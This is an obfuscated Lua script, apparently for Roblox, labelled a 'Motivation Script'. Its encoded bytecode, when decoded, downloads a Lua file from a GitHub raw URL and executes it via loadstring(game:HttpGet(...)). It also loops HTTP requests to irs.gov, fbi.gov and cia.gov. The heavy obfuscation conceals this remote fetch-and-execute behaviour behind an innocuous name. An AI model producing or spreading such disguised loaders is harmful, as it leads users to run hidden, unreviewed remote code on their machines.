--[[
Motivation Script
made by crfxx

(DO NOT SKID >_<)
]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 79) then
			local v83 = 0;
			while true do
				if (v83 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v84 = v2(v0(v30, 16));
			if v19 then
				local v91 = 0;
				local v92;
				while true do
					if (v91 == 1) then
						return v92;
					end
					if (v91 == 0) then
						v92 = v5(v84, v19);
						v19 = nil;
						v91 = 1;
					end
				end
			else
				return v84;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v85 = (v31 / ((5 - 3) ^ (v32 - 1))) % ((5 - 3) ^ (((v33 - (1 - 0)) - (v32 - (2 - 1))) + (620 - (555 + 64))));
			return v85 - (v85 % (932 - (857 + 19 + 55)));
		else
			local v86 = (1 + 1) ^ (v32 - (569 - (367 + 201)));
			return (((v31 % (v86 + v86)) >= v86) and (878 - (282 + 595))) or (927 - (214 + 713));
		end
	end
	local function v21()
		local v34 = 0 - 0;
		local v35;
		while true do
			if (v34 == ((1045 + 21) - (68 + 997))) then
				return v35;
			end
			if (v34 == (1270 - (226 + 1044))) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + (1638 - (1523 + 114));
				v34 = 1 + 0 + 0;
			end
		end
	end
	local function v22()
		local v36 = 957 - (892 + 65);
		local v37;
		local v38;
		while true do
			if (v36 == (2 - 1)) then
				return (v38 * (472 - 216)) + v37;
			end
			if (v36 == 0) then
				v37, v38 = v1(v16, v18, v18 + (3 - (1 + 0)));
				v18 = v18 + (352 - (87 + 263));
				v36 = 181 - (67 + 113);
			end
		end
	end
	local function v23()
		local v39, v40, v41, v42 = v1(v16, v18, v18 + (7 - (10 - 6)));
		v18 = v18 + 3 + 1;
		return (v42 * (66680831 - (90523321 - 40619706))) + (v41 * 65536) + (v40 * ((880 + 328) - (802 + 150))) + v39;
	end
	local function v24()
		local v43 = 0 + 0;
		local v44;
		local v45;
		local v46;
		local v47;
		local v48;
		local v49;
		while true do
			if (v43 == (1000 - (915 + 82))) then
				if (v48 == (0 - 0)) then
					if (v47 == ((0 - 0) + 0)) then
						return v49 * (0 - 0);
					else
						local v103 = 1187 - (1069 + 118);
						while true do
							if ((0 - 0) == v103) then
								v48 = 1 - (0 - 0);
								v46 = 0 + 0;
								break;
							end
						end
					end
				elseif (v48 == (3636 - (2448 - (814 + 45)))) then
					return ((v47 == (0 + (0 - 0))) and (v49 * (1 / 0))) or (v49 * NaN);
				end
				return v8(v49, v48 - 1023) * (v46 + (v47 / ((793 - (20 + 348 + 423)) ^ (163 - 111))));
			end
			if (v43 == (19 - (10 + 3 + 5))) then
				v46 = 3 - 2;
				v47 = (v20(v45, 443 - (416 + 26), 63 - 43) * ((1 + 1) ^ 32)) + v44;
				v43 = 3 - (886 - (261 + 624));
			end
			if ((438 - (145 + 293)) == v43) then
				v44 = v23();
				v45 = v23();
				v43 = 431 - (44 + 386);
			end
			if ((1488 - (998 + 488)) == v43) then
				v48 = v20(v45, 7 + 14, 26 + (8 - 3));
				v49 = ((v20(v45, 32) == (773 - ((1281 - (1020 + 60)) + (1994 - (630 + 793))))) and -(1139 - (116 + 1022))) or 1;
				v43 = (40 - 28) - 9;
			end
		end
	end
	local function v25(v50)
		local v51;
		if not v50 then
			v50 = v23();
			if (v50 == 0) then
				return "";
			end
		end
		v51 = v3(v16, v18, (v18 + v50) - (4 - 3));
		v18 = v18 + v50;
		local v52 = {};
		for v67 = 1 + 0, #v51 do
			v52[v67] = v2(v1(v3(v51, v67, v67)));
		end
		return v6(v52);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v53 = 0 + 0;
		local v54;
		local v55;
		local v56;
		local v57;
		local v58;
		local v59;
		local v60;
		while true do
			if (v53 ~= (935 - (39 + 896))) then
			else
				local v89 = 0 + 0;
				while true do
					if (v89 == 0) then
						v54 = 0 - 0;
						v55 = nil;
						v89 = 1 - 0;
					end
					if (v89 == (1146 - (466 + 679))) then
						v53 = 2 - 1;
						break;
					end
				end
			end
			if (1 == v53) then
				local v90 = 0 - 0;
				while true do
					if ((2 - 1) == v90) then
						v53 = 2 + 0;
						break;
					end
					if (0 == v90) then
						v56 = nil;
						v57 = nil;
						v90 = 1 + 0;
					end
				end
			end
			if (v53 == 3) then
				v60 = nil;
				while true do
					if (v54 == 0) then
						local v99 = 0 + 0;
						while true do
							if (v99 ~= (397 - (115 + 281))) then
							else
								v57 = {};
								v58 = {v55,v56,nil,v57};
								v99 = 2 + 0;
							end
							if (v99 ~= (0 - 0)) then
							else
								local v104 = 0 - 0;
								while true do
									if (v104 == 0) then
										v55 = {};
										v56 = {};
										v104 = 868 - (550 + 317);
									end
									if (v104 ~= 1) then
									else
										v99 = 585 - (57 + 527);
										break;
									end
								end
							end
							if (v99 == (1429 - (41 + 1386))) then
								v54 = 1;
								break;
							end
						end
					end
					if ((1 - 0) == v54) then
						local v100 = 0 - 0;
						local v101;
						while true do
							if (v100 ~= (0 + 0)) then
							else
								v101 = 0 - 0;
								while true do
									if (v101 == 2) then
										v54 = 5 - 3;
										break;
									end
									if (1 == v101) then
										for v112 = 286 - (134 + 151), v59 do
											local v113 = 1665 - (970 + 695);
											local v114;
											local v115;
											local v116;
											local v117;
											while true do
												if (v113 == (5 - 3)) then
													while true do
														if (v114 == (167 - (122 + 44))) then
															v117 = nil;
															while true do
																if (v115 == (0 - 0)) then
																	v116 = v21();
																	v117 = nil;
																	v115 = 1;
																end
																if (v115 == 1) then
																	if (v116 == (1991 - (582 + 1408))) then
																		v117 = v21() ~= (0 - 0);
																	elseif (v116 == (2 - 0)) then
																		v117 = v24();
																	elseif (v116 == (11 - 8)) then
																		v117 = v25();
																	end
																	v60[v112] = v117;
																	break;
																end
															end
															break;
														end
														if (v114 == (0 - 0)) then
															v115 = 1824 - (1195 + 629);
															v116 = nil;
															v114 = 1 - 0;
														end
													end
													break;
												end
												if (v113 == (1 - 0)) then
													v116 = nil;
													v117 = nil;
													v113 = 2;
												end
												if (v113 ~= (65 - (30 + 35))) then
												else
													v114 = 241 - (187 + 54);
													v115 = nil;
													v113 = 781 - (162 + 618);
												end
											end
										end
										v58[3 + 0] = v21();
										v101 = 2 + 0;
									end
									if ((0 - 0) ~= v101) then
									else
										v59 = v23();
										v60 = {};
										v101 = 3 - 2;
									end
								end
								break;
							end
						end
					end
					if (v54 == (2 - 0)) then
						local v102 = 0 + 0;
						while true do
							if (v102 == (1637 - (1373 + 263))) then
								return v58;
							end
							if ((1000 - (451 + 549)) ~= v102) then
							else
								for v105 = 1, v23() do
									local v106 = 0 + 0;
									local v107;
									local v108;
									while true do
										if (v106 ~= (1 - 0)) then
										else
											while true do
												if ((0 - 0) == v107) then
													v108 = v21();
													if (v20(v108, 1385 - (746 + 638), 1) == 0) then
														local v176 = 0;
														local v177;
														local v178;
														local v179;
														local v180;
														while true do
															if ((982 - (18 + 964)) == v176) then
																v177 = 0;
																v178 = nil;
																v176 = 1 + 0;
															end
															if (v176 ~= (1 - 0)) then
															else
																v179 = nil;
																v180 = nil;
																v176 = 2;
															end
															if (v176 == (2 + 0)) then
																while true do
																	if (v177 == (341 - (218 + 123))) then
																		local v193 = 1581 - (1535 + 46);
																		while true do
																			if (v193 ~= 1) then
																			else
																				v177 = 1;
																				break;
																			end
																			if (v193 == (0 + 0)) then
																				v178 = v20(v108, 2, 3);
																				v179 = v20(v108, 4, 1 + 5);
																				v193 = 1;
																			end
																		end
																	end
																	if (v177 ~= (561 - (306 + 254))) then
																	else
																		local v194 = 0 + 0;
																		while true do
																			if (v194 == (0 - 0)) then
																				local v200 = 1467 - (899 + 568);
																				while true do
																					if (v200 == (0 + 0)) then
																						v180 = {v22(),v22(),nil,nil};
																						if (v178 == (0 - 0)) then
																							local v201 = 603 - (268 + 335);
																							local v202;
																							while true do
																								if (v201 == (290 - (60 + 230))) then
																									v202 = 0;
																									while true do
																										if (v202 ~= (572 - (426 + 146))) then
																										else
																											v180[1 + 2] = v22();
																											v180[2 + 2] = v22();
																											break;
																										end
																									end
																									break;
																								end
																							end
																						elseif (v178 == 1) then
																							v180[3] = v23();
																						elseif (v178 == 2) then
																							v180[1459 - (282 + 1174)] = v23() - (2 ^ (41 - 25));
																						elseif (v178 == (814 - (569 + 242))) then
																							local v211 = 0 - 0;
																							while true do
																								if (v211 ~= (0 - 0)) then
																								else
																									v180[1 + 2] = v23() - ((1026 - (706 + 318)) ^ (1267 - (721 + 530)));
																									v180[1275 - (945 + 326)] = v22();
																									break;
																								end
																							end
																						end
																						v200 = 1552 - (1126 + 425);
																					end
																					if (v200 == (2 - 1)) then
																						v194 = 1 + 0;
																						break;
																					end
																				end
																			end
																			if (v194 ~= 1) then
																			else
																				v177 = 1123 - (118 + 1003);
																				break;
																			end
																		end
																	end
																	if (v177 == 3) then
																		if (v20(v179, 8 - 5, 3) ~= 1) then
																		else
																			v180[381 - (142 + 235)] = v60[v180[704 - (271 + 429)]];
																		end
																		v55[v105] = v180;
																		break;
																	end
																	if (v177 == (1 + 1)) then
																		local v196 = 0 + 0;
																		local v197;
																		while true do
																			if (v196 == (0 - 0)) then
																				v197 = 0;
																				while true do
																					if (v197 ~= 0) then
																					else
																						if (v20(v179, 1501 - (1408 + 92), 1 + 0) ~= (1087 - (461 + 625))) then
																						else
																							v180[1290 - (993 + 295)] = v60[v180[2 + 0]];
																						end
																						if (v20(v179, 2, 4 - 2) == (1 + 0)) then
																							v180[3] = v60[v180[1174 - (418 + 753)]];
																						end
																						v197 = 1 + 0;
																					end
																					if (v197 == (2 - 1)) then
																						v177 = 3;
																						break;
																					end
																				end
																				break;
																			end
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
											end
											break;
										end
										if (v106 == 0) then
											v107 = 0 + 0;
											v108 = nil;
											v106 = 4 - 3;
										end
									end
								end
								for v109 = 754 - (239 + 514), v23() do
									v56[v109 - (1 + 0)] = v28();
								end
								v102 = 1 + 0;
							end
						end
					end
				end
				break;
			end
			if (v53 == 2) then
				v58 = nil;
				v59 = nil;
				v53 = 3;
			end
		end
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1];
		local v65 = v61[2];
		local v66 = v61[3];
		return function(...)
			local v69 = v64;
			local v70 = v65;
			local v71 = v66;
			local v72 = v27;
			local v73 = 1;
			local v74 = -1;
			local v75 = {};
			local v76 = {...};
			local v77 = v12("#", ...) - 1;
			local v78 = {};
			local v79 = {};
			for v87 = 0, v77 do
				if (v87 >= v71) then
					v75[v87 - v71] = v76[v87 + 1];
				else
					v79[v87] = v76[v87 + 1];
				end
			end
			local v80 = (v77 - v71) + 1;
			local v81;
			local v82;
			while true do
				local v88 = 0;
				while true do
					if (v88 == 0) then
						v81 = v69[v73];
						v82 = v81[1];
						v88 = 1;
					end
					if (v88 == 1) then
						if (v82 <= 17) then
							if (v82 <= 8) then
								if (v82 <= 3) then
									if (v82 <= 1) then
										if (v82 == 0) then
											v79[v81[2]]();
										else
											v79[v81[2]] = v79[v81[3]];
										end
									elseif (v82 > 2) then
										local v120 = 0;
										local v121;
										while true do
											if (0 == v120) then
												v121 = v81[2];
												v79[v121] = v79[v121](v13(v79, v121 + 1, v81[3]));
												break;
											end
										end
									elseif (v81[2] == v79[v81[4]]) then
										v73 = v73 + 1;
									else
										v73 = v81[3];
									end
								elseif (v82 <= 5) then
									if (v82 > 4) then
										if (v79[v81[2]] ~= v81[4]) then
											v73 = v73 + 1;
										else
											v73 = v81[3];
										end
									else
										v79[v81[2]] = v81[3] ~= 0;
									end
								elseif (v82 <= 6) then
									local v123 = v81[2];
									v79[v123](v13(v79, v123 + 1, v81[3]));
								elseif (v82 == 7) then
									v79[v81[2]] = v79[v81[3]];
								else
									v79[v81[2]]();
								end
							elseif (v82 <= 12) then
								if (v82 <= 10) then
									if (v82 > 9) then
										v79[v81[2]] = v29(v70[v81[3]], nil, v63);
									else
										local v125 = v81[2];
										local v126 = {v79[v125](v79[v125 + 1])};
										local v127 = 0;
										for v146 = v125, v81[4] do
											v127 = v127 + 1;
											v79[v146] = v126[v127];
										end
									end
								elseif (v82 > 11) then
									if (v79[v81[2]] ~= v81[4]) then
										v73 = v73 + 1;
									else
										v73 = v81[3];
									end
								else
									v73 = v81[3];
								end
							elseif (v82 <= 14) then
								if (v82 > 13) then
									v79[v81[2]] = v29(v70[v81[3]], nil, v63);
								else
									local v130 = v81[2];
									local v131 = v79[v81[3]];
									v79[v130 + 1] = v131;
									v79[v130] = v131[v81[4]];
								end
							elseif (v82 <= 15) then
								local v135 = 0;
								local v136;
								local v137;
								while true do
									if (v135 == 1) then
										v79[v136 + 1] = v137;
										v79[v136] = v137[v81[4]];
										break;
									end
									if (v135 == 0) then
										v136 = v81[2];
										v137 = v79[v81[3]];
										v135 = 1;
									end
								end
							elseif (v82 > 16) then
								local v158 = v81[2];
								v79[v158](v13(v79, v158 + 1, v81[3]));
							else
								v79[v81[2]] = v63[v81[3]];
							end
						elseif (v82 <= 26) then
							if (v82 <= 21) then
								if (v82 <= 19) then
									if (v82 > 18) then
										if (v79[v81[2]] == v81[4]) then
											v73 = v73 + 1;
										else
											v73 = v81[3];
										end
									else
										local v138 = v81[2];
										v79[v138] = v79[v138](v79[v138 + 1]);
									end
								elseif (v82 == 20) then
									do
										return;
									end
								elseif (v81[2] == v79[v81[4]]) then
									v73 = v73 + 1;
								else
									v73 = v81[3];
								end
							elseif (v82 <= 23) then
								if (v82 > 22) then
									v73 = v81[3];
								elseif (v79[v81[2]] == v81[4]) then
									v73 = v73 + 1;
								else
									v73 = v81[3];
								end
							elseif (v82 <= 24) then
								local v141 = v81[2];
								v79[v141] = v79[v141](v13(v79, v141 + 1, v81[3]));
							elseif (v82 == 25) then
								v79[v81[2]] = v81[3];
							else
								local v166 = 0;
								local v167;
								local v168;
								local v169;
								while true do
									if (v166 == 0) then
										v167 = v81[2];
										v168 = {v79[v167](v79[v167 + 1])};
										v166 = 1;
									end
									if (v166 == 1) then
										v169 = 0;
										for v189 = v167, v81[4] do
											v169 = v169 + 1;
											v79[v189] = v168[v169];
										end
										break;
									end
								end
							end
						elseif (v82 <= 30) then
							if (v82 <= 28) then
								if (v82 == 27) then
									if v79[v81[2]] then
										v73 = v73 + 1;
									else
										v73 = v81[3];
									end
								elseif v79[v81[2]] then
									v73 = v73 + 1;
								else
									v73 = v81[3];
								end
							elseif (v82 == 29) then
								do
									return;
								end
							else
								for v149 = v81[2], v81[3] do
									v79[v149] = nil;
								end
							end
						elseif (v82 <= 32) then
							if (v82 == 31) then
								v79[v81[2]] = v81[3] ~= 0;
							else
								for v151 = v81[2], v81[3] do
									v79[v151] = nil;
								end
							end
						elseif (v82 <= 33) then
							v79[v81[2]] = v81[3];
						elseif (v82 == 34) then
							v79[v81[2]] = v63[v81[3]];
						else
							local v174 = v81[2];
							v79[v174] = v79[v174](v79[v174 + 1]);
						end
						v73 = v73 + 1;
						break;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!0A3O00028O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034E3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F6372662O782F726F626C6F782D6D6F7469766174696F6E2D7363726970742F6D61696E2F6D61696E2E6C756103043O0077616974027B14AE47E17A843F026O00F03F03053O007063612O6C2O01002C3O0012193O00013O0026163O0001000100010004173O00010001001222000100023O001222000200033O00200D000200020004001219000400054O00030002000400022O001F000300014O00030001000300022O0008000100010001001222000100063O001219000200074O001200010002000200061C0001002B00013O0004173O002B0001001219000100014O001E000200043O00261600010022000100080004173O002200012O001E000400043O00261600020015000100010004173O00150001001222000500093O00020E00066O00090005000200062O0001000400064O0001000300053O0026050003000B0001000A0004173O000B00012O001D3O00013O0004173O000B00010004173O001500010004173O000B000100261600010012000100010004173O00120001001219000200014O001E000300033O001219000100083O0004173O001200010004173O000B00010004173O002B00010004173O000100012O001D3O00013O00013O00073O00028O0003043O0067616D6503073O00482O7470476574030F3O00682O7470733A2O2F6972732E676F76030F3O00682O7470733A2O2F6662692E676F76026O00F03F030F3O00682O7470733A2O2F6369612E676F7600153O0012193O00013O000E020001000C00013O0004173O000C0001001222000100023O00200D000100010003001219000300044O0011000100030001001222000100023O00200D000100010003001219000300054O00110001000300010012193O00063O0026163O0001000100060004173O00010001001222000100023O00200D000100010003001219000300074O00110001000300010004173O001400010004173O000100012O001D3O00017O00", v9(), ...);
